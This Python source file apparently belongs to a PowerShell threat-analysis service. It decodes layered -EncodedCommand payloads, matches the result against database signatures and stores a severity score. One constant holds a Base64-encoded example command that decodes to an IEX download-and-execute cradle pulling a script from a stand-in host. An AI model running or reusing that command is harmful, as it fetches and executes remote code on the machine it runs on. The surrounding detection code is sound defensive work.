"""PowerShell Analyzer Service
"""
import regex
import time
import json
import secrets
import string
import base64
from services.session_manager import get_supabase_client
from config.settings import CACHE_DURATION


from services import detectors
from services.detectors import (
    process_command_for_evasion,
    detect_evasion,
    get_adjusted_score_and_severity,
)




EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA'

try:
    import ppdeep
    PPDEEP_AVAILABLE = True
except ImportError:
    PPDEEP_AVAILABLE = False
        


signatures_cache = None
cache_timestamp = 0


def generate_short_id(length: int = 8) -> str:
    characters = string.ascii_lowercase + string.digits
    return ''.join(secrets.choice(characters) for _ in range(length))


async def load_signatures_from_db(user_id: str = None) -> list:
    """Load signatures with optimized caching"""
    global signatures_cache, cache_timestamp
    
    try:
        now = int(time.time() * 1000)
        
       
        cache_key = "signatures_free"  
        
        is_premium_user = False
        if user_id:
            supabase = get_supabase_client()
            profile_response = supabase.table('profiles').select('is_premium_user').eq('id', user_id).single().execute()
            if profile_response.data:
                is_premium_user = profile_response.data.get('is_premium_user', False)
        
      
        cache_key = f"signatures_{'premium' if is_premium_user else 'free'}"
        
        
        if signatures_cache and cache_timestamp and cache_key in signatures_cache and (now - cache_timestamp) < CACHE_DURATION:
            return signatures_cache[cache_key]
        
        supabase = get_supabase_client()
        
        
     
        query = supabase.table('powershell_signatures').select('*').eq('is_active', True)
        
        if not is_premium_user:
            query = query.eq('is_premium_indicator', False)
        
        response = query.order('basescore', desc=True).execute()
        signatures_data = response.data if response.data else []

        
        query_premium = supabase.table('premium_indicators').select('*').eq('is_active', True)
        
        response_premium = query_premium.order('basescore', desc=True).execute()
        
        if response_premium.data:
            signatures_data.extend(response_premium.data)
        
        if signatures_data:
            public_indicators_response = supabase.table('public_indicators').select('name').execute()
            public_indicator_names = {item['name'] for item in public_indicators_response.data} if public_indicators_response.data else set()

            converted_signatures = []
            for sig in signatures_data:
               
                sig_name = sig.get("name", "Unknown")
                indicator_type = "community" if sig_name in public_indicator_names else "private"
                
               
                link = None
                if indicator_type == "community":
                    file_path = sig.get("file_path", "")
                    
                    if file_path:
                        filename = file_path.split("/")[-1]
                        link = f"https://github.com/avasero/psexposed/blob/main/indicators/{filename}"
                
                converted_signatures.append({
                    "name": sig_name,
                    "patterns": sig.get("patterns", []) if isinstance(sig.get("patterns"), list) else [],
                    "severity": sig.get("severity", "unknown"),
                    "tactics": sig.get("tactics", []) if isinstance(sig.get("tactics"), list) else [],
                    "techniques": sig.get("techniques", []) if isinstance(sig.get("techniques"), list) else [],
                    "score": float(sig.get("basescore", 0)),
                    "description": sig.get("description", "No description available"),
                    "reference": sig.get("reference", []) if isinstance(sig.get("reference"), list) else [],
                    "max_match": int(sig.get("max_match", 1)),
                    "link": link,
                    "is_premium_indicator": sig.get("is_premium_indicator", False),
                    "indicator_type": indicator_type,
                    "san_regex": sig.get("san_regex", None),
                    "san_score": float(sig.get("san_score")) if sig.get("san_score") is not None else None
                })
            
            
            if not signatures_cache:
                signatures_cache = {}
            
            signatures_cache[cache_key] = converted_signatures
            cache_timestamp = now
            
            return converted_signatures
        else:
            print("No signatures found in database")
            return []
            
    except Exception as error:
        print(f"[ERROR] Loading signatures: {type(error).__name__}")
        return []


def decode_base64_utf16(encoded_str: str) -> str:
    try:
        encoded_str = encoded_str.replace(' ', '').replace('\n', '').replace('\r', '')

        if not encoded_str:
            return ""

        # Handle truncated base64: length % 4 == 1 is INVALID in base64
        # Remove trailing character to make it valid
        remainder = len(encoded_str) % 4
        if remainder == 1:
            encoded_str = encoded_str[:-1]

        # Add proper padding
        padding_needed = (4 - len(encoded_str) % 4) % 4
        padded_str = encoded_str + ('=' * padding_needed)

        decoded_bytes = base64.b64decode(padded_str, validate=False)
        decoded_text = decoded_bytes.decode('utf-16-le', errors='ignore')

        return decoded_text

    except Exception:
        return ""


def decode_powershell(command: str) -> tuple:
    """
    Decode a PowerShell command through multiple layers.

    Handles:
    - Base64 encoded commands (-EncodedCommand)
    - Format string resolution ("{0}{1}" -f "a","b")

    Args:
        command: Raw PowerShell command to decode

    Returns:
        tuple: (final_command, decode_iterations, processing_type, decoded_layers)
            - final_command: The fully decoded command
            - decode_iterations: Number of Base64 decoding passes
            - processing_type: "none", "base64_decoded", or "format_decoded"
            - decoded_layers: List of intermediate decoded states
    """
    

    current_command = command
    max_decode_iterations = 5
    iteration = 0
    processing_type = "none"
    decoded_layers = []
    successfully_decoded = False



    while iteration < max_decode_iterations:
       
        encoded_match = regex.search(
            detectors.ENCODED_COMMAND_PATTERN,
            current_command,
            regex.IGNORECASE
        )

       

        if encoded_match:
         
            iteration += 1
            payload_b64 = encoded_match.group(1)
            decoded_payload = decode_base64_utf16(payload_b64)
            is_valid_decode = (
                len(decoded_payload) > 0 and
                decoded_payload != payload_b64
            )
           

            if is_valid_decode:
                decoded_layers.append({
                    "iteration": iteration,
                    "decoded": decoded_payload
                })

                current_command = decoded_payload
                processing_type = "base64_decoded"
                successfully_decoded = True
               


                has_more_encoding = regex.search(
                    detectors.ENCODED_COMMAND_PATTERN,
                    decoded_payload,
                    regex.IGNORECASE
                )

                if not has_more_encoding:
                   
                    break
            else:
               
                iteration -= 1
                break
        else:
            break

    base64_iterations = iteration if successfully_decoded else 0

    if base64_iterations > 0:
        return current_command, base64_iterations, processing_type, decoded_layers

    return command, 0, "none", []


async def analyze_command_patterns(command: str, signatures: list, allow_decoded_analysis: bool = True) -> dict:
    """
    Analyzes PowerShell command for malicious patterns.

    Handles format string decoding and Base64 decoding before pattern matching.
    Now also supports AST-based deobfuscation via external PowerShell service.

    Args:
        command: Raw PowerShell command to analyze
        signatures: List of signature dictionaries to match against
        allow_decoded_analysis: If False, only analyze the raw command (not decoded content).
                               Used when user has reached decode quota limit.

    Returns:
        dict: Analysis results including detected_signatures, total_score, etc.
    """
   

    # Pre-sanitize command for decoding by applying all san_regex patterns
    sanitized_for_decode = command
    san_regex_applied_count = 0
    for sig in signatures:
        san_regex_raw = sig.get("san_regex")
        if san_regex_raw:
            try:
                if isinstance(san_regex_raw, str):
                    san_patterns = json.loads(san_regex_raw)
                else:
                    san_patterns = san_regex_raw

                if isinstance(san_patterns, list):
                    for san_pattern in san_patterns:
                        before_len = len(sanitized_for_decode)
                        sanitized_for_decode = regex.sub(san_pattern, "", sanitized_for_decode, flags=regex.IGNORECASE)
                        if len(sanitized_for_decode) != before_len:
                            san_regex_applied_count += 1
                else:
                    before_len = len(sanitized_for_decode)
                    sanitized_for_decode = regex.sub(san_patterns, "", sanitized_for_decode, flags=regex.IGNORECASE)
                    if len(sanitized_for_decode) != before_len:
                        san_regex_applied_count += 1
            except (json.JSONDecodeError, regex.error):
                pass

       

    
    encoding_result = detectors.detect_encoded_command(sanitized_for_decode)
   
    
    first_decoded = None
    double_decoded = None
    double_encoding_indicator = None

  

    if encoding_result["is_encoded"]:
        first_decoded = encoding_result.get("decoded_preview")
      

        if first_decoded:
            double_encoding_result = detectors.detect_double_encoded_command(
                command=sanitized_for_decode,
                decoded_command=first_decoded,
                decode_iterations=1
            )

            if double_encoding_result["is_double_encoded"]:
                double_decoded = double_encoding_result.get("second_level_decoded")
                double_encoding_indicator = double_encoding_result.get("indicator")
                print(f"[DEBUG analyze_command_patterns] double_decoded: {double_decoded[:200] if double_decoded else 'None'}")
    else:
        print(f"[DEBUG analyze_command_patterns] encoding_result['is_encoded'] is False - NO DECODING WILL HAPPEN")

    detected_signatures = []
    total_score = 0.0
    tactics_set = set()
    techniques_set = set()

    raw_command = command

    
    fully_decoded, decode_iterations, processing_type, decoded_layers = decode_powershell(sanitized_for_decode)
    has_decoded = fully_decoded != sanitized_for_decode
  

    first_decoded_layer = None
    second_decoded_layer = None

    if decoded_layers:
        if len(decoded_layers) >= 1:
            first_decoded_layer = decoded_layers[0]["decoded"]
        if len(decoded_layers) >= 2:
            second_decoded_layer = decoded_layers[1]["decoded"]
            print(f"[DEBUG analyze_command_patterns] second_decoded_layer (first 200 chars): {second_decoded_layer[:200]}")
    
    
    
    
   
    
    # AST-based deobfuscation results (populated if AST service is enabled)
    ast_deobfuscated = None
    ast_techniques = []

    if decode_iterations >= 2:
        double_encoded_sig = next((sig for sig in signatures if sig.get("name") == "Double Encoded Command Detected"), None)
        
        if double_encoded_sig:
            
            detected_signatures.append({
                "name": "Double Encoded Command Detected",
                "description": f"Multiple layers of Base64 encoding detected: {decode_iterations} nested -EncodedCommand parameters found",
                "severity": double_encoded_sig["severity"],
                "base_score": double_encoded_sig["score"],
                "matches_found": 1,
                "total_score": double_encoded_sig["score"],
                "max_match_allowed": 1,
                "pattern": f"{decode_iterations}_layer_encoding",
                "matches_details": [{
                    "matched_text": f"Layer 1: {first_decoded_layer[:80] if first_decoded_layer else 'N/A'}...",
                    "position": {"start": 0, "end": len(raw_command)},
                    "match_number": 1,
                    "matched_in": "original"
                }],
                "tactics": double_encoded_sig.get("tactics", ["Defense Evasion"]),
                "techniques": double_encoded_sig.get("techniques", ["T1027.010", "T1140"]),
                "reference": double_encoded_sig.get("reference", []),
                "link": double_encoded_sig.get("link"),
                "is_premium_indicator": False,
                "indicator_type": double_encoded_sig.get("indicator_type", "community"),
                "found_in_decoded": False
            })
            
            tactics_set.update(double_encoded_sig.get("tactics", ["Defense Evasion"]))
            techniques_set.update(double_encoded_sig.get("techniques", ["T1027.010", "T1140"]))
            total_score += double_encoded_sig["score"]

    # Check for double-encoding via FromBase64String (detected in first decoded layer)
    if double_encoding_indicator == "Notable base64 in encoded command" and decode_iterations < 2:
        frombase64_sig = next((sig for sig in signatures if sig.get("name") == "Notable base64 in encoded command"), None)
        if frombase64_sig:
            detected_signatures.append({
                "name": "Notable base64 in encoded command",
                "description": "FromBase64String contains a base64 string starting with JA (UTF-16LE encoded PowerShell), indicating a double-encoded payload",
                "severity": frombase64_sig["severity"],
                "base_score": frombase64_sig["score"],
                "matches_found": 1,
                "total_score": frombase64_sig["score"],
                "max_match_allowed": frombase64_sig["max_match"],
                "pattern": "FromBase64String_double_encoding",
                "matches_details": [{
                    "matched_text": f"FromBase64String payload decoded: {double_decoded[:80] if double_decoded else 'N/A'}...",
                    "position": {"start": 0, "end": len(raw_command)},
                    "match_number": 1,
                    "matched_in": "decoded"
                }],
                "tactics": frombase64_sig.get("tactics", ["Defense Evasion", "Execution"]),
                "techniques": frombase64_sig.get("techniques", ["T1027.001", "T1140", "T1059.001"]),
                "reference": frombase64_sig.get("reference", []),
                "link": frombase64_sig.get("link"),
                "is_premium_indicator": frombase64_sig.get("is_premium_indicator", False),
                "indicator_type": frombase64_sig.get("indicator_type", "community"),
                "found_in_decoded": True
            })
            tactics_set.update(frombase64_sig.get("tactics", ["Defense Evasion", "Execution"]))
            techniques_set.update(frombase64_sig.get("techniques", ["T1027.001", "T1140", "T1059.001"]))
            total_score += frombase64_sig["score"]

    encoding_detection = detectors.detect_encoded_command(raw_command)

    # Note: We detect encoded commands for decoding purposes but don't display them as indicators
    # The decoding functionality and quota tracking are preserved

    has_encoded_command_indicator = encoding_detection["is_encoded"]
    
    
    commands_to_analyze = [raw_command]


    commands_set = {raw_command}

   
    if allow_decoded_analysis:

        if decode_iterations >= 1 and fully_decoded and fully_decoded != command:
            commands_set.add(fully_decoded)


        if first_decoded and first_decoded != command:
            commands_set.add(first_decoded)


        if double_decoded:
            commands_set.add(double_decoded)
    else:
        print(f"[ANALYZE] Decode limit reached - analyzing RAW command only (no decoded content)")

    # AST-based deobfuscation is now handled asynchronously via the deobfuscation queue.
    # Results are populated later and the DB record is updated when processing completes.

    commands_to_analyze = list(commands_set)
    
    
    skip_signatures = {"Obfuscation Detected", "Encoded Command Detected", "Double Encoded Command Detected", "Heavily Obfuscated Command", "Notable base64 in encoded command"}
    if has_encoded_command_indicator:
        skip_signatures.add("Long base64 strings")
    
    for signature in signatures:
        if signature.get("name") in skip_signatures:
            continue
        
        all_signature_matches = []
        matched_pattern = None
        matched_in_decoded = False
        matched_via_sanitization = False

        for command in commands_to_analyze:

            is_decoded_version = (command != raw_command)

            # Process command for evasion detection (san_regex)
            command, was_sanitized, matches_before_count = process_command_for_evasion(
                command, signature
            )

            for pattern in signature["patterns"]:
                try:
                    compiled_pattern = regex.compile(pattern, regex.IGNORECASE)
                    pattern_matches = list(compiled_pattern.finditer(command))

                    if pattern_matches:
                        if matched_pattern is None:
                            matched_pattern = pattern

                        if is_decoded_version:
                            matched_in_decoded = True

                        # Detect evasion using the detector module
                        if detect_evasion(was_sanitized, matches_before_count, len(pattern_matches)):
                            matched_via_sanitization = True

                        for match in pattern_matches:
                            matched_text = match.group(0)
                            match_start = match.start()
                            match_end = match.end()
                            
                            all_signature_matches.append({
                                "matched_text": matched_text,
                                "position": {
                                    "start": match_start,
                                    "end": match_end
                                },
                                "matched_in": "decoded" if is_decoded_version else "original"
                            })
                            

                except regex.error:
                    continue

        unique_matches = []
        seen_positions = set()
        
        for match_info in all_signature_matches:
            position_key = (
                match_info["position"]["start"],
                match_info["position"]["end"],
                match_info["matched_text"],
                match_info["matched_in"]
            )
            if position_key not in seen_positions:
                seen_positions.add(position_key)
                unique_matches.append(match_info)
        
        matches_found = min(len(unique_matches), signature["max_match"])
        final_matches = unique_matches[:matches_found]

        if matches_found > 0:
            # Get adjusted score and severity using evasion detector
            signature_total_score, adjusted_severity, san_score_applied = get_adjusted_score_and_severity(
                signature, matched_via_sanitization
            )

            detected_signature = {
                "name": signature["name"],
                "description": signature["description"],
                "severity": adjusted_severity,
                "base_score": signature["score"],
                "matches_found": matches_found,
                "total_score": signature_total_score,
                "max_match_allowed": signature["max_match"],
                "pattern": matched_pattern or signature["patterns"][0] if signature["patterns"] else "Unknown pattern",
                "matches_details": [
                    {
                        "matched_text": match_info["matched_text"],
                        "position": match_info["position"],
                        "match_number": i + 1,
                        "matched_in": match_info["matched_in"]
                    }
                    for i, match_info in enumerate(final_matches)
                ],
                "tactics": signature["tactics"],
                "techniques": signature["techniques"],
                "reference": signature.get("reference", []),
                "link": signature.get("link"),
                "is_premium_indicator": signature.get("is_premium_indicator", False),
                "indicator_type": signature.get("indicator_type", "community"),
                "found_in_decoded": matched_in_decoded,
                "san_score_applied": san_score_applied,
                "san_score": signature.get("san_score") if san_score_applied else None
            }
            
            detected_signatures.append(detected_signature)

            tactics_set.update(signature["tactics"])
            techniques_set.update(signature["techniques"])
            total_score += signature_total_score

    # Post-processing: If "Plain encoded command usage" is detected,
    # remove "Long base64 string" matches from original command
    # (the base64 is already part of -EncodedCommand, so it should only match in decoded)
    has_encoded_command = any(
        sig["name"] == "Plain encoded command usage"
        for sig in detected_signatures
    )

    if has_encoded_command:
        filtered_signatures = []
        for sig in detected_signatures:
            if sig["name"] == "Long base64 string":
                # Only keep matches from decoded command
                decoded_matches = [
                    m for m in sig["matches_details"]
                    if m.get("matched_in") == "decoded"
                ]
                if decoded_matches:
                    sig["matches_details"] = decoded_matches
                    sig["matches_found"] = len(decoded_matches)
                    filtered_signatures.append(sig)
                else:
                    # No decoded matches, remove this signature and adjust score
                    total_score -= sig["total_score"]
            else:
                filtered_signatures.append(sig)
        detected_signatures = filtered_signatures

        # Recalculate tactics and techniques from remaining signatures
        tactics_set = set()
        techniques_set = set()
        for sig in detected_signatures:
            tactics_set.update(sig.get("tactics", []))
            techniques_set.update(sig.get("techniques", []))

    return {
        "detected_signatures": detected_signatures,
        "total_score": total_score,
        "tactics": list(tactics_set),
        "techniques": list(techniques_set),
        "decoded_command": first_decoded if allow_decoded_analysis else None,
        "double_decoded_command": double_decoded if allow_decoded_analysis else None,
        "deobfuscated_command": ast_deobfuscated,
        "deobfuscation_techniques": ast_techniques
    }


def calculate_severity_and_risk(total_score: float) -> str:
    """
    Score Ranges:
    - 10.0+: Critical (Red) - Extremely notable, likely suspicious activity
    - 8.0 - 9.99: High (Orange) - Highly notable activity
    - 5.0 - 7.99: Medium (Yellow) - Fairly notable activity
    - 2.0 - 4.99: Low (Green) - Relevant activity
    - 1.0 - 1.99: Informational (Blue) - Extremely common, benign behavior
    """
    severity = "informational"
    if total_score >= 10:
        severity = "critical"
    elif total_score >= 8:
        severity = "high"
    elif total_score >= 5:
        severity = "medium"
    elif total_score >= 2:
        severity = "low"
    return severity


async def save_analysis_to_db(
    command: str,
    analysis_result: dict,
    user_id: str = None,
    session_id: str = None,
    ip_address: str = None,
    country: str = None,
    search_type: str = "API",
    user_agent: str = "FastAPI-Client",
    is_cache: bool = False,
    count_as_decode: bool = None
) -> dict:
    """Save analysis result to the database.

    Args:
        count_as_decode: If provided, overrides the automatic has_decoded_content calculation.
                        Use False when user doesn't have decode permission (so it doesn't count against quota).
                        Use None to auto-calculate based on whether decoded content exists.
    """

    # Maximum sizes for text fields (PostgreSQL TEXT can hold much more, but we limit for performance)
    MAX_COMMAND_LENGTH = 100000
    MAX_DECODED_LENGTH = 100000

    def truncate_if_needed(text: str, max_length: int, field_name: str) -> str:
        if text and len(text) > max_length:
            print(f"[TRUNCATE] {field_name} truncated from {len(text)} to {max_length} chars")
            return text[:max_length] + "... [TRUNCATED]"
        return text

    try:
        supabase = get_supabase_client()
        short_id = generate_short_id()

        ip_country = country if country and country != 'Unknown' else None

        decoded_cmd = analysis_result.get("decoded_command")
        double_decoded_cmd = analysis_result.get("double_decoded_command")

        is_example_command = command.strip() == EXAMPLE_ENCODED_COMMAND.strip()

        # If count_as_decode is explicitly provided, use it
        # Otherwise, auto-calculate based on whether decoded content exists
        if count_as_decode is not None:
            has_decoded_content = count_as_decode and not is_example_command
        else:
            has_decoded_content = bool(
                (decoded_cmd or double_decoded_cmd) and not is_example_command
            )

       

        # Truncate large fields to prevent DB errors
        safe_command = truncate_if_needed(command, MAX_COMMAND_LENGTH, "command")
        safe_decoded = truncate_if_needed(decoded_cmd, MAX_DECODED_LENGTH, "decoded_command")
        safe_double_decoded = truncate_if_needed(double_decoded_cmd, MAX_DECODED_LENGTH, "double_decoded_command")

        deobfuscated_cmd = analysis_result.get("deobfuscated_command")
        safe_deobfuscated = truncate_if_needed(deobfuscated_cmd, MAX_DECODED_LENGTH, "deobfuscated_command") if deobfuscated_cmd else None
        deobfuscation_techniques = analysis_result.get("deobfuscation_techniques", [])

        # Cap risk_score to 999.9 (DB field has precision 4, scale 1)
        risk_score = min(round(analysis_result["total_score"], 1), 999.9)

        insert_data = {
            "command": safe_command,
            "decoded_command": safe_decoded,
            "double_decoded_command": safe_double_decoded,
            "deobfuscated_command": safe_deobfuscated,
            "deobfuscation_techniques": deobfuscation_techniques if deobfuscation_techniques else None,
            "has_decoded_content": has_decoded_content,
            "risk_score": risk_score,
            "severity": analysis_result["severity"],
            "signatures_detected": analysis_result["detected_signatures"],
            "tactics": analysis_result["tactics"],
            "techniques": analysis_result["techniques"],
            "cmdlets_detected": analysis_result.get("cmdlets_detected", []),
            "ip_address": ip_address,
            "ip_country": ip_country,
            "search_type": search_type,
            "user_agent": user_agent,
            "short_id": short_id,
            "is_cache": is_cache
        }

        if user_id:
            insert_data["user_id"] = user_id
        if session_id:
            insert_data["session_id"] = session_id

        insert_data = {k: v for k, v in insert_data.items() if v is not None}

        db_response = supabase.table('powershell_analyses').insert(insert_data).execute()
        if db_response.data:
            return {
                "success": True,
                "db_id": db_response.data[0].get('id'),
                "uuid": db_response.data[0].get('uuid'),
                "short_id": short_id,
            }
        else:
            return {"success": False, "error": "Failed to save analysis"}

    except Exception as db_error:
        print(f"[ERROR] Database error: {type(db_error).__name__}: {str(db_error)}")
        return {"success": False, "error": str(db_error)}


def clear_signatures_cache():
    """Clear the in-memory signatures cache
    """
    global signatures_cache, cache_timestamp
    signatures_cache = None
    cache_timestamp = 0

